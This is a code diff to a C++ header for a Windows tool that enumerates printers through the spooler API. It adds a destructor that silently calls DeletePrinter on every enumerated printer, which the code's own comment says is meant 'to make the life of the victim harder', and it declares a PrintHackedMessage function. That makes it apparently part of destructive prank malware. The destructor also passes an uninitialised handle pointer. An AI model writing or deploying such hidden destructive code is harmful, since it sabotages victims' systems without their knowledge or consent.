@@ -1,7 +1,14 @@
 #include "Includes.h"
+//Logs for interface implementation
 #include "Logs.h"
-#include "Colors.h"
+//Printer/Spooler headers (winspool)
 #include <winspool.h>
+
+//No terminal in release mode so no need to include Colors.h
+#ifdef _DEBUG
+	#include "Colors.h"
+#endif
+
 #pragma once
 
 //Documentations to read :
@@ -9,7 +16,7 @@
 
 struct PrinterInformations {
 
-	//Operator << to print our PrinterInformations dae right waey !
+	//Operator <<ï¿½to print our PrinterInformations dae right waey !
 	friend std::ostream& operator<<(std::ostream& outputStream, const PrinterInformations& c) {
 		outputStream << "Printer Name : " << c.PrinterName << std::endl;
 		outputStream << "Default Printer : " << (c.DefaultPrinter == true ? "True" : "False") << std::endl;
@@ -24,6 +31,44 @@ struct PrinterInformations {
 		outputStream << "Printer Priority : " << c.PrinterPriority << std::endl;
 		outputStream << "Printer Average Print Per Minute : " << c.PrinterAveragePM << std::endl << std::endl;
 		return outputStream;
+	}
+
+	~PrinterInformations(){
+		//Delete Printer from list to make the life of the victim harder lel.
+		LPHANDLE hPrinter;
+		if(OpenPrinterA((LPSTR)this->PrinterName.c_str(), hPrinter, NULL) != 0){
+			//If the function succeed and we have a handle on the current printer
+			//Try to delete the printer.
+			try{
+				if(DeletePrinter(hPrinter)){
+					//Log Delete printer succeeded.
+				} else {
+					throw std::runtime_error(std::string("Error when trying to delete printer ") + this->PrinterName);
+				}
+			} catch(std::runtime_error& e){
+				#ifdef _DEBUG
+					//Print to console
+					std::cout << e.what() << std::endl;
+				#else
+					//Log to file
+				#endif
+			} catch(std::exception& e){
+				#ifdef _DEBUG
+					//Print to console
+					std::cout << e.what() << std::endl;
+				#else
+					//Log to file
+				#endif
+			} catch(...){
+				#ifdef _DEBUG
+					//Print to console
+					std::cout << "Something odd happened when trying to delete PrinterInformations" << std::endl;
+				#else
+					//Log to file
+				#endif
+			}
+			
+		}
 	}
 	std::string PrinterName; //Name of the printer
 	
@@ -58,9 +103,10 @@ struct PrinterInformations {
 struct Printers : public Logs {
 	//LOGS INTERFACE IMPLEMENTATION
 	bool OutputFile(const std::string& message, const std::string& path) override;
-	bool OutputEncryptedContent(const std::string& message, const std::string& path) noexcept override;
+	bool OutputEncryptedContent(const std::string& message, const std::string& path) noexcept override; //TODO : Remove the noexcept
 	//Functions and Members
 	std::string DefaultPrinterName;
 	std::vector<PrinterInformations> Printers; //Vector of PrinterInformations (Basically our list of printers)
 	bool EnumeratePrintersInformation();
+	void PrintHackedMessage();
 };
